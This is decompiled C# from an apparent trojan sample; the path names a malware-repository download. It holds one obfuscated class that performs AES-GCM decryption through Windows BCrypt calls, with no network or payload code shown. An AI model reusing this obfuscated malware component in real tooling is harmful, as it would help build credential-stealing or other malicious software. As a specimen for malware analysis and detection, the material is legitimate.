// Decompiled with JetBrains decompiler
// Type: ̔Rϫ퓜מ.�Śᔖ丐߻
// Assembly: iJMJnUDAnLMGBkvrphkwZ, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BCFE5CC-61DE-4CD2-8DAF-2FBF230839CD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-1f53f14c48ecd545980d315ae494ea6a2bd99fa1e9a3671debdf80626942bd2c.exe

using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Ӻג䕃ҭ\uFFFD;

namespace \u0314Rϫ퓜מ
{
  internal class \uFFFDŚᔖ丐\u07FB
  {
    public byte[] iҢʭ\u0026盀(
      byte[] _param1,
      byte[] _param2,
      byte[] _param3,
      byte[] _param4,
      byte[] _param5)
    {
      IntPtr num1 = this.\uFFFD\u002Dëʪ\uFFFD(\uFFFD̀ۨ\u058F꼺.ƌŎƌ㹃ׁ, \uFFFD̀ۨ\u058F꼺.\u05C9Wş盀ē, \uFFFD̀ۨ\u058F꼺.꾯\u07B8\u00AB\uFFFD\uFFFD);
      IntPtr num2;
      IntPtr hglobal = this.Թϫɩڿ콪(num1, _param1, out num2);
      \uFFFD̀ۨ\u058F꼺.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authenticatedCipherModeInfo = new \uFFFD̀ۨ\u058F꼺.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(_param2, _param3, _param5);
      byte[] numArray1;
      using (authenticatedCipherModeInfo)
      {
        byte[] numArray2 = new byte[checked (this.Uלհ\uDBB6\uDC98(num1) - 1 + 1)];
        int num3 = 0;
        uint num4 = \uFFFD̀ۨ\u058F꼺.\uFFFD\uFFFD盀ջҏ(num2, _param4, _param4.Length, ref authenticatedCipherModeInfo, numArray2, numArray2.Length, (byte[]) null, 0, ref num3, 0);
        if (num4 > 0U)
          throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() (get size) failed with status code: {0}", (object) num4));
        numArray1 = new byte[checked (num3 - 1 + 1)];
        uint num5 = \uFFFD̀ۨ\u058F꼺.\uFFFD\uFFFD盀ջҏ(num2, _param4, _param4.Length, ref authenticatedCipherModeInfo, numArray2, numArray2.Length, numArray1, numArray1.Length, ref num3, 0);
        if ((int) num5 == (int) \uFFFD̀ۨ\u058F꼺.k\u058FΑęή)
          throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");
        if (num5 > 0U)
          throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() failed with status code:{0}", (object) num5));
      }
      int num6 = (int) \uFFFD̀ۨ\u058F꼺.Ϙ\uFFFD뫆ҡۨ(num2);
      Marshal.FreeHGlobal(hglobal);
      int num7 = (int) \uFFFD̀ۨ\u058F꼺.\u00AB\uFFFDʪՄՄ(num1, 0U);
      return numArray1;
    }

    private int Uלհ\uDBB6\uDC98(IntPtr _param1)
    {
      byte[] numArray = this.Ϙ븤Մ\u05C9ג(_param1, \uFFFD̀ۨ\u058F꼺.Ò\uFFFDƜ쐬\uFFFD);
      return BitConverter.ToInt32(new byte[4]
      {
        numArray[4],
        numArray[5],
        numArray[6],
        numArray[7]
      }, 0);
    }

    private IntPtr \uFFFD\u002Dëʪ\uFFFD(string _param1, string _param2, string _param3)
    {
      IntPtr zero = IntPtr.Zero;
      uint num1 = \uFFFD̀ۨ\u058F꼺.\u065AϘʤ\uFFFD盀(out zero, _param1, _param2, 0U);
      if (num1 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}", (object) num1));
      byte[] bytes = Encoding.Unicode.GetBytes(_param3);
      uint num2 = \uFFFD̀ۨ\u058F꼺.늻\uFFFDלҏ뫆(zero, \uFFFD̀ۨ\u058F꼺.\uFFFDCƉ\uFFFDс, bytes, bytes.Length, 0);
      if (num2 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}", (object) num2));
      return zero;
    }

    private IntPtr Թϫɩڿ콪(IntPtr _param1, byte[] _param2, out IntPtr _param3)
    {
      int int32 = BitConverter.ToInt32(this.Ϙ븤Մ\u05C9ג(_param1, \uFFFD̀ۨ\u058F꼺.\uFFFD\uFFFDņ\u02E8\uFFFD), 0);
      IntPtr num1 = Marshal.AllocHGlobal(int32);
      byte[] numArray = this.i\uFFFḐ\uFFFD퓜(\uFFFD̀ۨ\u058F꼺.콪ē\uFFFD̮ۣ, BitConverter.GetBytes(1), BitConverter.GetBytes(_param2.Length), _param2);
      uint num2 = \uFFFD̀ۨ\u058F꼺.\uFFFDԹ鈇\uFFFDz(_param1, IntPtr.Zero, \uFFFD̀ۨ\u058F꼺.Ă\uDAAE\uDD04\uFFFDz, out _param3, num1, int32, numArray, numArray.Length, 0U);
      if (num2 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptImportKey() failed with status code:{0}", (object) num2));
      return num1;
    }

    private byte[] Ϙ븤Մ\u05C9ג(IntPtr _param1, string _param2)
    {
      int num1 = 0;
      uint num2 = \uFFFD̀ۨ\u058F꼺.\uDAE4\uDDD1Ś\u07BB\uFFFD(_param1, _param2, (byte[]) null, 0, ref num1, 0U);
      if (num2 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() (get size) failed with status code:{0}", (object) num2));
      byte[] numArray = new byte[checked (num1 - 1 + 1)];
      uint num3 = \uFFFD̀ۨ\u058F꼺.\uDAE4\uDDD1Ś\u07BB\uFFFD(_param1, _param2, numArray, numArray.Length, ref num1, 0U);
      if (num3 > 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() failed with status code:{0}", (object) num3));
      return numArray;
    }

    public byte[] i\uFFFḐ\uFFFD퓜(params byte[][] _param1)
    {
      int num = 0;
      byte[][] numArray1 = _param1;
      int index1 = 0;
      while (index1 < numArray1.Length)
      {
        byte[] numArray2 = numArray1[index1];
        if (numArray2 != null)
          checked { num += numArray2.Length; }
        checked { ++index1; }
      }
      byte[] dst = new byte[checked (num - 1 + 1 - 1 + 1)];
      int dstOffset = 0;
      byte[][] numArray3 = _param1;
      int index2 = 0;
      while (index2 < numArray3.Length)
      {
        byte[] src = numArray3[index2];
        if (src != null)
        {
          Buffer.BlockCopy((Array) src, 0, (Array) dst, dstOffset, src.Length);
          checked { dstOffset += src.Length; }
        }
        checked { ++index2; }
      }
      return dst;
    }
  }
}
